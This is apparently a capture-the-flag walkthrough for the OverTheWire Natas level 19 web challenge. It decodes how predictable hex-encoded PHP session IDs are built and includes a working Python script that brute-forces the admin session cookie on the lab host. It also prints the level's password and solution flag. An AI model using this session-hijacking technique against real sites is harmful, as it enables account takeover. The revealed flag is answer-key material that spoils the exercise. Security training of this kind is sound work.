# Natas Level 19

Access data:

    username: natas19
    password: 8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s

We are told that this is a variation of the previous challenge, but it does not use sequential session IDs. 

Playing around with different username + passwords via burp you can observe that the session ID grows with longer usernames and password does not influence the resulting value. This is not random, maybe we can understand the pattern. Let's try it a bit more systematically with these values:

    username, password = session id

    a,a = 3237382d61
    a,b = 3136332d61
    b,a = 3239372d62
    b,b = 3632392d62

The last two digits change depending on the username. They are also the hex values for the character if you consult an [ASCII Table](https://www.rapidtables.com/code/text/ascii-table.html).

If you know resend the same credentials (a, a) multiple times, you'll observe that the session ID always ends with _2d61_. A bit more playing around reveals a structure like this for the session id:

      *something_that_changes* + *static_2d* + *username_in_ascii*


This means we only need _*something_that_changes*_, the rest we can predict / extract. 

Spamming a bit more, it seems like _*something_that_changes*_ are just one, two or three numbers, each of them being between 30 and 40. This was good enough for me to try to brute-force it - with success! Here is the code.

```python
    import requests, itertools

    user = "natas19"
    password = "8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s"
    url = f"http://{user}.natas.labs.overthewire.org"

    def bruteforce_session_ids(session, possibilites):
        for number_tuple in possibilites:
            sess_id = "".join(str(number) for number in number_tuple) #Join integers to string
            sess_id += "2d" #static separator
            sess_id += "61646d696e" #Ascii representation of 'admin'

            print(f"Testing: {sess_id}")
            cookies = {"PHPSESSID" : sess_id}
            resp = session.post(url, cookies=cookies)

            if(not "regular user" in resp.text):
                print(resp.text)
                print(f"Admin cookie: {sess_id}")
                exit("Terminating after successful attack")
            
        return False    


    with requests.Session() as session:
        session.auth = (user, password)
        auth = session.post(url)

        possibleNumbers = [30, 31, 32, 33, 34, 35, 36, 37, 38, 39] 

        combinations_of_one = list(itertools.product(possibleNumbers, repeat=1))
        combinations_of_two = list(itertools.product(possibleNumbers, repeat=2))
        combinations_of_three = list(itertools.product(possibleNumbers, repeat=3))

        bruteforce_session_ids(session, combinations_of_one)
        bruteforce_session_ids(session, combinations_of_two)
        bruteforce_session_ids(session, combinations_of_three)

```

<details>
  <summary>Solution</summary>
  Flag: guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH
</details>


